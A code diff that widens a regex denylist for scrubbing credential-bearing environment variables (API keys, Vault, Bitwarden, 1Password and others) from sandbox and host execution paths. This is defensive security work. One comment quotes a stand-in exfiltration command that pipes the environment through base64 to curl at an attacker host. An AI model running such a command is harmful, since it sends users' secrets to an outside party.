@@ -17,6 +17,21 @@ const SCRUB_PATTERNS: readonly RegExp[] = [
   /_SECRET$/i,
   /_PASSWORD$/i,
   /_PASS$/i,
+  // Slice 162 (review — env scrub expansion). Generic credential-
+  // shape suffixes that pre-slice escaped the denylist. The 5-axis
+  // security review flagged ad-hoc credential vars (VAULT_ADDR,
+  // BW_SESSION, etc.) reaching sandboxless macOS / host-profile
+  // paths via `env | base64 | curl attacker.com`. The macOS
+  // clearenv parity wire (slice 162 part 1) closes the sandboxed
+  // path; these patterns close the host / degraded path.
+  /_KEY$/i, // *_KEY: PRIVATE_KEY, SECRET_KEY, ENCRYPTION_KEY, ...
+  /_AUTH$/i, // *_AUTH: REGISTRY_AUTH, DOCKER_AUTH, ...
+  /_BEARER$/i, // *_BEARER: BEARER tokens
+  /_CRED$/i, // *_CRED: GCLOUD_CRED, AWS_CRED, ...
+  /_CREDS$/i, // plural variant
+  /_PRIVATE_KEY$/i, // explicit (caught by _KEY too; pinned for clarity)
+  /_SESSION$/i, // *_SESSION: BW_SESSION, AUTH_SESSION, generic session tokens
+  /_COOKIE$/i, // *_COOKIE: auth cookies stored in env (rare but seen)
   /^AWS_/i,
   /^OPENAI_/i,
   /^ANTHROPIC_/i,
@@ -26,6 +41,16 @@ const SCRUB_PATTERNS: readonly RegExp[] = [
   /^GH_TOKEN$/i,
   /^NPM_TOKEN$/i,
   /^DOCKER_PASSWORD$/i,
+  // Slice 162 (review — env scrub expansion): service-specific
+  // credential vars whose names don't end in the canonical suffixes.
+  /^VAULT_/i, // HashiCorp Vault: VAULT_TOKEN, VAULT_ADDR (server URL is also sensitive — leaks infra topology)
+  /^BW_/, // Bitwarden CLI: BW_SESSION (session id), BW_CLIENTID, BW_CLIENTSECRET
+  /^LPASS_/i, // LastPass CLI: LPASS_PROCESS_PID, LPASS_AGENT_TIMEOUT
+  /^LASTPASS_/i, // LASTPASS_USER (PII; also adjacent to credential auth)
+  /^OP_CONNECT_/i, // 1Password Connect: OP_CONNECT_TOKEN, OP_CONNECT_HOST
+  /^DOPPLER_TOKEN$/i, // Doppler secrets manager
+  /^INFISICAL_TOKEN$/i, // Infisical secrets manager
+  /^TWILIO_ACCOUNT_SID$/i, // Twilio: account SID is half the auth pair
   // Slice 128 (R4 P1): credential / session vars that DON'T match
   // the standard `_TOKEN`/`_SECRET`/`_KEY`/`_PASSWORD` suffix
   // patterns. Each is documented to carry a credential or session
